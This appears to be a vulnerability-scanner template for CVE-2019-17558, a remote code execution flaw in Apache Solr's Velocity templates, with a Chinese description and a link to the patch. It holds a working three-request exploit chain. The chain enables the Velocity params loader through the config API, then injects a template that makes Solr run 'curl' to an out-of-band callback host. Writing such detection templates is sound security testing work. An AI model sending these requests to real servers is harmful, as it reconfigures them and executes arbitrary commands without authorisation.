id: CVE-2019-17558
info:
  name: Apache Solr <=8.3.1 - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Apache Solr Velocity 模版注入远程命令执行漏洞
    Apache Solr 5.0.0到Apache Solr 8.3.1容易受到通过VelocityResponseWriter执行的远程代码的攻击。Velocity模板可以通过configset ' Velocity / '目录中的Velocity模板或作为参数提供。用户定义的configset可以包含可呈现的、潜在的恶意模板。参数提供的模板在默认情况下是禁用的，但是可以通过设置params.resource.loader来启用。通过定义一个响应写入器并将其设置为true来启用。定义响应编写器需要配置API访问。Solr 8.4完全删除了params资源加载器，只有在configset是“可信的”(由经过身份验证的用户上传)时才启用configset提供的模板呈现。
  severity: high
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://issues.apache.org/jira/browse/SOLR-13971
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: status
    status:
    - 200
  extractors:
  - name: core
    type: regex
    regex:
    - '"name"\:"(.*?)"'
    group: 1
    internal: true
  matchers-condition: and
  raw:
  - |
    GET /solr/admin/cores?wt=json HTTP/1.1
    Host: {{Hostname}}
  - |
    POST /solr/{{core}}/config HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json

    {
        "update-queryresponsewriter": {
          "startup": "lazy",
          "name": "velocity",
          "class": "solr.VelocityResponseWriter",
          "template.base.dir": "",
          "solr.resource.loader.enabled": "true",
          "params.resource.loader.enabled": "true"
        }
    }
  - |
    GET /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27curl%20http://{{interactsh-url}}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
    Host: {{Hostname}}
    Connection: close
